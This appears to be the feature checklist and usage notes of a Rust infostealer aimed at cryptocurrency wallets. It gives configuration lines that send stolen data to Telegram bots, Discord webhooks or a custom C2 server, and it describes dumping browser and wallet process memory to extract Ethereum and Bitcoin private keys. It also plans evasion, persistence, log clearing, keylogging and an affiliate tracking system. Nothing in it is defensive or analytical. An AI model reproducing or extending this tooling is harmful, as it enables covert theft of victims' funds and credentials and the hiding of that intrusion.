## Exfiltration Methods

- [x] Telegram integration (module exists, wired to main.rs)
- [x] Discord integration (module exists, wired to main.rs)
- [ ] DNS tunneling (stub only)

**Usage:**
```bash
# Telegram
export HMM_TRANSPORT_ENDPOINT="telegram://BOT_TOKEN/CHAT_ID"

# Discord  
export HMM_TRANSPORT_ENDPOINT="discord://https://discord.com/api/webhooks/ID/TOKEN"

# HTTPS (custom C2)
export HMM_TRANSPORT_ENDPOINT="https://your-c2-server.com/upload"
export HMM_TRANSPORT_API_KEY="your-api-key"
```

## Memory Extraction Module

- [x] Process enumeration (find MetaMask/Chrome/Electron processes)
- [x] Memory dumping (ReadProcessMemory / procfs)
- [x] Pattern scanning (search for key formats)
- [x] String extraction + entropy filtering
- [x] Key validation (checksum verification)

**Features:**
- Scans Chrome, Firefox, Brave, Edge, Electron processes
- Detects Ethereum keys (64 hex chars)
- Detects Bitcoin WIF keys (51-52 base58 chars)
- High-entropy string detection (potential encrypted keys/seeds)
- Confidence scoring (Low/Medium/High)
- Linux and Windows support

**Checksum Verification:**
- Bitcoin WIF: Double SHA256 checksum verification
- Ethereum: secp256k1 curve order range validation [1, n-1]
- Base58 decoding with invalid character detection

    Wallet Decryption
     - [ ] MetaMask vault decryption (needs DPAPI + user password)
     - [ ] Exodus wallet decryption
     - [ ] Electrum wallet decryption
     - [ ] Firefox key4.db + logins.json decryption

    Backend/C2
     - [ ] C2 server (not implemented - you must build/host your own)
     - [ ] Log panel/dashboard
     - [ ] Affiliate tracking system

    Evasion Enhancements
     - [ ] String obfuscation/encryption
     - [ ] Code packing
     - [ ] Process injection (hollowing, reflective DLL)
     - [ ] Fileless execution
     - [ ] API hashing

    Persistence
     - [ ] Registry Run keys
     - [ ] Scheduled tasks
     - [ ] Startup folder
     - [ ] Service installation

    Cleanup
     - [ ] Self-destruction
     - [ ] Log clearing (Windows Event Logs)
     - [ ] Timestomping

    Other Modules (not wallet-related)
     - [ ] Screenshot (stub)
     - [ ] Keylogger (stub)
     - [ ] Clipboard monitor (stub)
     - [ ] Webcam capture (stub)
     - [ ] Audio recording (stub)

    ---